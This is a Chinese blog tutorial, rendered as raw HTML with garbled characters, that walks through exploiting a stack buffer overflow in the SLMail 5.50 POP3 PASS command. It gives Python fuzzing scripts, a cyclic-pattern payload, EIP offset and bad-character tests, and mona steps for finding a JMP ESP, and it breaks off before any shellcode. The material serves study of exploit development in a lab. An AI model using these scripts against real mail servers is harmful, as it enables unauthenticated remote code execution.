                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  2.8k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  13 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰"><a href="#1-FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰" class="headerlink" title="1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰"></a>1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰</h4><ul>
<li>SLMail 5.50 Mail Serverï¼ˆé»˜è®¤å®‰è£…ï¼ŒAbout NT User Importï¼Œno insteadï¼‰</li>
<li>ImmunityDebugger_1_85_setup.exeï¼ˆè¦å®‰è£…python2.7ç‰ˆæœ¬ï¼Œä¸å¯3.0ï¼‰</li>
<li>mona.pyï¼ˆGithubä¸Šä¸‹è½½ï¼‰</li>
</ul>
<blockquote>
<pre><code>windowä¸Šçœ‹å¼€å¯çš„æœåŠ¡
1.netstat -naoï¼ˆcmdï¼‰
2.services.mscï¼ˆå…è®¸win+Rï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>mona.pyæ”¾åœ¨ImmunityDebuggerä¸­
å³é”® â†’ æŸ¥æ‰¾ç›®æ ‡ â†’ PyCommonds â†’ æ‹·è´mona.py</code></pre></blockquote>
<h4 id="2-FUZZER"><a href="#2-FUZZER" class="headerlink" title="2. FUZZER"></a>2. FUZZER</h4><ul>
<li>SLMail 5.50 Mail Serverï¼ˆä¸åŒç«¯å£å¼€çš„ä¸åŒæœåŠ¡ï¼Œéƒ½æœ‰ä¸åŒæŒ‡ä»¤å¯ä»¥å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼‰<ul>
<li>POP3 PASSå‘½ä»¤å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼ˆnc SMTP or POP3,shell codeè¿›è¡Œè¯•æ¢)</li>
<li>æ— éœ€èº«ä»½éªŒè¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</li>
<li>DEPï¼šé˜»æ­¢ä»£ç ä»æ•°æ®é¡µè¢«æ‰§è¡Œï¼ˆCPUç‰¹æ€§ï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿè½¯ç¡¬ä»¶å®ç°ï¼Œå¯ç»•è¿‡DEPï¼‰</li>
<li>ALSAï¼šéšæœºå†…å­˜åœ°å€åŠ è½½æ‰§è¡Œç¨‹åºç›’DDLï¼Œæ¯æ¬¡é‡å¯åœ°å€å˜åŒ–ï¼ˆåŠ¨æ€å†…å­˜åœ°å€åˆ†é…ï¼Œé€šè¿‡shellç›´æ¥è·³è½¬åˆ°å›ºå®šçš„å†…å­˜åœ°å€ï¼Œæ“ä½œç³»ç»Ÿå®ç°ï¼Œåœ¨window vistaä¹‹ååŠ å…¥ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>åœ¨Kaliç«¯ï¼Œå‘å³é”®æœåŠ¡å™¨å‘é€å¤§é‡å‘½ä»¤ç»„åˆçš„å­—ç¬¦ä¸²ï¼ˆå¦‚ï¼šUSER;lsï¼‰
åœ¨window xpç«¯ï¼Œç”¨ImmunityDebuggeræŸ¥çœ‹åœ¨å‘é€å‘½ä»¤æ—¶æ˜¯å¦ä¼šå‡ºç°ç¼“å†²åŒºæº¢å‡º</code></pre></blockquote>
<h4 id="3-POP3"><a href="#3-POP3" class="headerlink" title="3. POP3"></a>3. POP3</h4><ul>
<li>nc IPåœ°å€ 110ç«¯å£</li>
<li>äº†è§£æœªçŸ¥åè®®<ul>
<li>Wiresharkï¼ˆæŠ“åŒ…åˆ†æå­¦ä¹ ï¼‰</li>
<li>æ ‡å‡†RFCï¼ˆæŸ¥è¯¢åè®®çš„å‚æ•°ï¼Œè¿›è¡Œå­¦ä¹ ï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./01.py</code></strong>ï¼ˆæµ‹è¯•æ˜¯å¦èƒ½è¿æ¥POP3æœåŠ¡å™¨ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&apos;IPåœ°å€&apos;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;USER yuanfh&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>æµ‹è¯•PASSå‘½ä»¤æ¥æ”¶åˆ°å¤§é‡æ•°æ®æ˜¯å¦ä¼šæº¢å‡ºï¼ˆéœ€è¦å‘é€çš„æ•°æ®å¤§äºç¼“å†²åŒºï¼‰</li>
<li>EIPå¯„å­˜å™¨å­˜æ”¾ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼ˆé¦–å…ˆå…³æ³¨EIPï¼ŒESPï¼ŒEDPï¼Œå¯ä½¿æŒ‡å‘shell codeçš„åœ°å€ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./02.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer=[&apos;A&apos;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;IPåœ°å€&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>ImmunityDebuggerè°ƒè¯•ï¼ˆè®°å½•ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼Œä¸ºä¸­é—´æ•°æ®çš„æ‹¦æˆªã€è®°å½•ï¼‰ï¼š
1.Open â†’ æ‰“å¼€ä¸€ä¸ªé™æ€çš„exeæ–‡ä»¶
2.Attack â†’ æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼ˆé€šè¿‡PIDåŒºattackï¼Œattackä¼šä½¿è¿›ç¨‹åœæ­¢ï¼Œéœ€ç‚¹å‡»å¼€å§‹ï¼‰</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>2700ä¸ªå­—ç¬¦å®ç°EIPå¯„å­˜å™¨æº¢å‡º</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./03.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰¾åˆ°ç²¾ç¡®æº¢å‡ºçš„4ä¸ªå­—èŠ‚<ul>
<li>äºŒåˆ†æ³•</li>
<li>å”¯ä¸€å­—ä¸²æ³•</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./pattern_offset.rb EIPçš„4ä¸ªåå…­è¿›åˆ¶æ•°å­—</code></strong>ï¼ˆé€šè¿‡å·¥å…·æ‰¾åˆ°ä½ç½®ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./04.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&apos;</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰¾åˆ°ç²¾ç¡®æº¢å‡ºçš„4ä¸ªå­—èŠ‚<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./05.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*20</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>windowç³»ç»Ÿä¸ºå°ç«¯å­˜å‚¨å½¢å¼ï¼Œä½ä½é«˜åœ°å€ï¼Œé«˜ä½ä½åœ°å€
EIPä¸º4ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ï¼Œå¯é€šè¿‡ASCIIæ¢ç®—æˆå­—ç¬¦ä¸²
ESPå­˜æ”¾ç€EIPæº¢å‡ºçš„å†…å®¹ï¼Œå¯ä»¥å¡«æ”¾shell codeä½œä¸ºè¿œç¨‹æ‰§è¡Œä»£ç </code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>æ€è·¯ï¼š<ul>
<li>å°†EIPä¿®æ”¹ä¸ºShellcodeä»£ç çš„å†…å­˜åœ°å€ï¼Œå°†Shellcodeå†™å…¥åˆ°è¯¥åœ°å€ç©ºé—´ï¼Œç¨‹åºè¯»å–EIPå¯„å­˜å™¨æ•°å€¼ï¼Œå°†è·³è½¬åˆ°Shellcodeä»£ç æ®µå¹¶æ‰§è¡Œ</li>
</ul>
</li>
<li>å¯»æ‰¾å¯å­˜æ”¾Shellcodeçš„å†…å®¹ç©ºé—´</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./06.py</code></strong>ï¼ˆæŸ¥çœ‹ESPå¯„å­˜å™¨å¯å­˜æ”¾å¤šå°‘ä¸ªå­—ç¬¦ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*(3500-2607-4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>


<h4 id="7-FUZZING"><a href="#7-FUZZING" class="headerlink" title="7. FUZZING"></a>7. FUZZING</h4><ul>
<li>ä¸åŒç±»å‹çš„ç¨‹åºã€åè®®ã€æ¼æ´ï¼Œä¼šå°†æŸäº›å­—ç¬¦è®¤ä¸ºæ˜¯åå­—ç¬¦ï¼Œè¿™äº›å­—ç¬¦æœ‰å›ºå®šç”¨é€”<ul>
<li>è¿”å›åœ°å€ã€Shellcodeã€bufferä¸­éƒ½ä¸èƒ½å‡ºç°åå­—ç¬¦</li>
<li>null byteï¼ˆ0x00ï¼‰ç©ºå­—ç¬¦ï¼Œç”¨äºç»ˆæ­¢å­—ç¬¦ä¸²æ‹·è´çš„æ“ä½œ</li>
<li>returnï¼ˆ0x0Dï¼‰å›è½¦æ“ä½œï¼Œè¡¨ç¤ºPOP3 PASSå‘½ä»¤è¾“å…¥å®Œæˆ</li>
<li>æ€è·¯ï¼šå‘é€0x00â€“0xff 256ä¸ªå­—ç¬¦ï¼ŒæŸ¥æ‰¾æ‰€æœ‰çš„åå­—ç¬¦</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./07.py</code></strong>ï¼ˆæŸ¥æ‰¾åå­—ç¬¦ï¼‰</li>
<li>0x0Aï¼ˆå¯¼è‡´åé¢æ•°æ®æ— æ³•å‡ºç°ï¼‰</li>
<li>0x0Dï¼ˆè¢«è¿‡æ»¤ï¼‰</li>
<li>0x00ï¼ˆè¢«è¿‡æ»¤ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>å­—ç¬¦ä¼ è¿›å¯„å­˜å™¨ï¼Œå¯èƒ½ä¼šè¢«è¿‡æ»¤ï¼Œä¹Ÿå¯èƒ½ä½¿æœåŠ¡ç«¯carsh</code></pre></blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=&#123;&#125;</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+badchars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="8-FUZZING"><a href="#8-FUZZING" class="headerlink" title="8. FUZZING"></a>8. FUZZING</h4><ul>
<li>é‡å®šå‘æ•°æ®æµ<ul>
<li>ç”¨ESPçš„åœ°å€æ›¿æ¢EIPçš„å€¼</li>
<li>ä½†æ˜¯ESPåœ°å€å˜åŒ–ï¼Œç¡¬ç¼–ç ä¸å¯è¡Œï¼ˆæ¯æ¬¡æ“ä½œç³»ç»Ÿéšæœºåˆ†é…ï¼‰</li>
<li>SLMailçº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€æ®µåœ°å€èŒƒå›´ï¼Œæ¯ä¸ªçº¿ç¨‹åœ°å€èŒƒå›´ä½¿ä¸ç¡®å®šçš„</li>
</ul>
</li>
<li>å˜é€šæ€è·¯<ul>
<li>åœ¨å†…å­˜ä¸­å¯»æ‰¾åœ°å€å›ºå®šçš„ç³»ç»Ÿæ¨¡å—</li>
<li>åœ¨æ¨¡å—ä¸­å¯»æ‰¾JMP ESPæŒ‡å®šçš„åœ°å€è·³è½¬ï¼Œå†ç”±è¯¥æŒ‡ä»¤é—´æ¥è·³è½¬åˆ°ESPï¼Œä»è€Œæ‰§è¡ŒShellcode</li>
<li>mono.pyè„šæœ¬è¯†åˆ«å†…å­˜æ¨¡å—ï¼Œæœç´¢â€return addressâ€æ˜¯JMP ESPæŒ‡ä»¤çš„æ¨¡å—</li>
<li>å¯»æ‰¾æ— DEPã€ALSRä¿æŠ¤çš„å†…å­˜åœ°å€</li>
<li>å†…å­˜åœ°å€ä¸åŒ…å«åå­—ç¬¦</li>
</ul>
</li>
</ul>
<h4 id="9-FUZZING"><a href="#9-FUZZING" class="headerlink" title="9. FUZZING"></a>9. FUZZING</h4><ul>
<li>å¯»æ‰¾ä¸å—ä¿æŠ¤çš„ç³»ç»Ÿæ¨¡å—<ul>
<li>!mona modules</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Rebaseï¼šæ“ä½œç³»ç»Ÿé‡å¯ï¼Œå†…å­˜åœ°å€æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ŒåŸºåœ°å€å˜åŒ–ï¼Œä¸ºFalse
SafeSEHã€ASLRï¼šæ“ä½œç³»ç»Ÿæä¾›çš„å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼Œä¸ºFalse
OS DLLï¼šæ“ä½œç³»ç»Ÿè‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¸ºTrue</code></pre></blockquote>
<ul>
<li>å°†æ±‡ç¼–æŒ‡ä»¤JMP ESPè½¬æ¢ä¸ºäºŒè¿›åˆ¶<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./nasm shell</code></strong></li>
<li>FFE4</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>msfè„šæœ¬å·¥å…·ï¼š
/usr/share/metasploit-framwork/tools/nasm_shell rbï¼ˆæ±‡ç¼–è¯­è¨€è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼‰</code></pre></blockquote>
<ul>
